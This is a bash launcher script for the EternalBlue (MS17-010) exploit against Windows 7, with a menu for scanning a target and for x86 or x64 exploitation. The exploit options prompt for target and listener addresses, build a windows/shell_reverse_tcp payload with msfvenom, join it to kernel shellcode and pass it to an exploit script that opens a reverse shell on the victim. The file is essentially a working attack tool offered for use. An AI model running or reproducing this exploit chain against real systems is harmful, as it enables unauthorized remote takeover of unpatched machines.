#!/bin/bash

declare -r White="\e[97m"
declare -r GrayLight="\e[37m"
declare -r GrayDark="\e[90m"
declare -r Red="\e[31m"
declare -r RedLight="\e[91m"
declare -r Green="\e[32m"
declare -r GreenLight="\e[92m"
declare -r Yellow="\e[33m"
declare -r YellowLight="\e[93m"
declare -r Blue="\e[34m"
declare -r BlueLight="\e[94m"
declare -r Magenta="\e[35m"
declare -r MagentaLight="\e[95m"
declare -r Cyan="\e[36m"
declare -r CyanLight="\e[96m"
declare -r End="\e[0m"

declare -r shell="$"
declare -r var1="1"
declare -r var2="2"
declare -r var3="3"
declare -r var4="4"
declare -r var5="Scan"
declare -r var6="Exploit Windows 7"
declare -r var7="x86"
declare -r var8="x64"
declare -r var9="["
declare -r var10="]"
declare -r var11="+"
declare -r var12="--"
declare -r var13="Exit"
declare -r var14="¿"
declare -r var15="?"
declare -r var16="RHOST"
declare -r var17="LHOST"
declare -r var18="LPORT"
declare -r var19="Creating SHELLCODE with MSFVENOM"
declare -r var20="EternalBlue"
declare -r var21="MS17-010"
declare -r var22="i"
declare -r var23="x"
declare -r var24="checking root user"
declare -r var25="root"
declare -r var26="NO root"
declare -r var27="checking msfvenom installed"
declare -r var28="msfvenom"
declare -r var29="msfvenom not installed"

function check(){
		echo ""
		echo -e "$White$var9$YellowLight$var22$White$var10 $White$var24$End"
	    	sleep 2
	if [ "$(id -u)" == "0" ]; then
	    	echo ""
	    	echo -e "$White$var9$GreenLight$var11$White$var10 $White$var25$End"
	    	sleep 2
	    	echo ""
    	else
	    	echo ""
	    	echo -e "$White$var9$Red$var23$White$var10 $White$var26$End"
	    	sleep 2
	    	echo ""
		exit 1
    	fi
}

function msf(){
		echo -e "$White$var9$YellowLight$var22$White$var10 $White$var27$End"
		sleep 2
	    	which msfvenom > /dev/null 2>&1
    	if [ "$(echo $?)" == "0" ]; then
		echo ""
	    	echo -e "$White$var9$GreenLight$var11$White$var10 $White$var28$End"
	    	sleep 2
	    	echo ""
		clear
	else
        	echo ""
	    	echo -e "$White$var9$Red$var23$White$var10 $White$var29$End"
	    	sleep 2
	    	echo ""
	    	exit 1
    	fi
}

function banner(){
	echo ""
    	echo -e "$BlueLight┌═══════════════════════════════════┐$End"
    	echo -e "$BlueLight║$Blue  ██╗    ██╗██╗███╗   ██╗███████╗  $BlueLight║$End"
    	echo -e "$BlueLight║$Blue  ██║    ██║██║████╗  ██║╚════██║  $BlueLight║$End" 
    	echo -e "$BlueLight║$Blue  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $BlueLight║$End" 
    	echo -e "$BlueLight║$Blue  ██║███╗██║██║██║╚██╗██║   ██╔╝   $BlueLight║$End"  
    	echo -e "$BlueLight║$Blue  ╚███╔███╔╝██║██║ ╚████║   ██║    $BlueLight║$End"
    	echo -e "$BlueLight║$Blue   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $BlueLight║$End"   
    	echo -e "$BlueLight║$Blue ██████╗ ██╗     ██╗   ██╗███████╗ $BlueLight║$End"
    	echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔════╝ $BlueLight║$End"
    	echo -e "$BlueLight║$Blue ██████╔╝██║     ██║   ██║█████╗   $BlueLight║$End"  
    	echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔══╝   $BlueLight║$End" 
    	echo -e "$BlueLight║$Blue ██████╔╝███████╗╚██████╔╝███████╗ $BlueLight║$End"
    	echo -e "$BlueLight║$Blue ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $BlueLight║$End"
	echo -e "$BlueLight║$White $var9$Blue$var11$White$var10  $Green$var20 $White$var12 $Green$var21  $White$var9$Blue$var11$White$var10 $BlueLight║$End"
	echo -e "$BlueLight└═══════════════════════════════════┘$End"
}

function main(){
	echo ""
	echo -e "$White$var9$Blue$var1$White$var10 $var5$End"
	echo -e "$White$var9$Blue$var2$White$var10 $var6 $Blue$var7$End"
	echo -e "$White$var9$Blue$var3$White$var10 $var6 $Blue$var8$End"
	echo -e "$White$var9$Blue$var4$White$var10 $var13$End"
	echo ""
}

function menu(){

read -p " $(echo -e $Blue$shell $End)" opc

	if [ $opc -eq 1 ]; then
		echo ""
		echo -e "$White$var14$Blue$var16$White$var15$End"
		echo ""
		read rhost
		echo ""
    		python2 eternalblue_scanner.py $rhost
    		echo ""
		exit 0
	elif [ $opc -eq 2 ]; then
		echo ""
		echo -e "$White$var14$Blue$var16$White$var15$End"
		echo ""
		read rhost
		echo ""
		echo -e "$White$var14$Blue$var17$White$var15$End"
		echo ""
		read lhost
		echo ""
		echo -e "$White$var14$Blue$var18$White$var15$End"
		echo ""
		read lport
		echo ""
		rm -rf sc_x86_msf.bin
		rm -rf sc_x86.bin
		echo -e "$Blue$var19$End"
		echo ""
		sleep 2
		msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
		sleep 1
        	cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
        	sleep 1
        	python3 ms17_010_eternalblue.py $rhost sc_x86.bin
	   	exit
	elif [ $opc -eq 3 ]; then
        	echo ""
		echo -e "$White$var14$Blue$var16$White$var15$End"
		echo ""
		read rhost
		echo ""
		echo -e "$White$var14$Blue$var17$White$var15$End"
		echo ""
		read lhost
		echo ""
		echo -e "$White$var14$Blue$var18$White$var15$End"
		echo ""
		read lport
		echo ""
		rm -rf sc_x64_msf.bin
		rm -rf sc_x64.bin
		echo -e "$Blue$var19$End"
		echo ""
		sleep 2
		msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
		sleep 1
        	cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
        	sleep 1
        	python3 ms17_010_eternalblue.py $rhost sc_x64.bin
	elif [ $opc -eq 4 ]; then
		echo ""
		exit 0
	else
		:
    	fi
}

function start(){
	clear
	check
	msf
	banner
	main
	menu
}

start
